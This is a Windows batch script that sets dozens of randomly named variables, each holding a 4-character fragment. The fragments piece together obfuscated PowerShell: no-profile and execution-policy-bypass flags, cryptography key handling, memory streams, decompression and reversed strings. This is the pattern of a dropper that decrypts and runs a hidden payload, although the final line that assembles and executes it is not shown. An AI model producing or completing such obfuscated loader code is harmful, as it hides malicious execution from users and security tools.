@echo off
set "YbXNXhIRtq='oPV"
set "pBrGAstLpK=Wyqo"
set "bryRODiJSP=saBm"
set "czdeyhSojO=gMod"
set "hRJDqDvXUR=BWqM"
set "JwkpacpcHP=m.Re"
set "CcFJLooelH=O.Me"
set "EBWYIsycCb=Syst"
set "OufyjRjaOm=orF'"
set "RvMGuxnBhA=);$J"
set "dxWAjdlCFY=rity"
set "VEhbBGUmLg=.Cry"
set "FHNgCWhZyw=am;$"
set "NSMMoljYvf=stem"
set "shBpsKBuMl=..-1"
set "GqkBaKJTHn=grap"
set "TIVxwIKudn=ne);"
set "YTTLYAXPdd=);$L"
set "AlahgnVfoF=-nop"
set "DHDzRMdDXm=join"
set "qNBqztZaWN=yTo("
set "pYWBkXbhra=y.Ci"
set "ungiNFVZOL=join"
set "tFdmPPzRKv=-joi"
set "fMtOPCprVp='txe"
set "ryHsZJqGzK=();$"
set "TJNeYZbpOV=FcNh"
set "ENujstABDa=.Key"
set "phXlFUCibc=m(, "
set "qWBJRBoFhY=raph"
set "QDKAenjeTP=;$JJ"
set "frEbwBOcLK=n ''"
set "UFxFHHKmEy=trea"
set "DWmVnonaQg=-ep "
set "DjpdtgaSov=ress"
set "ThziMvywjr=]::N"
set "xTfmGVmNFW=::('"
set "qbTlHozsqv=sion"
set "PBFaGkYKpn=lit("
set "eQVqwFMguP=BSce"
set "ueuCqUyQyx=rofi"
set "EFMNWSwexF= '')"
set "JMplsXvvIm=($cv"
set "vqSSFFOYIZ=tS46"
set "IDpwYfbsCM=).Sp"
set "brZRDxqAky=nirt"
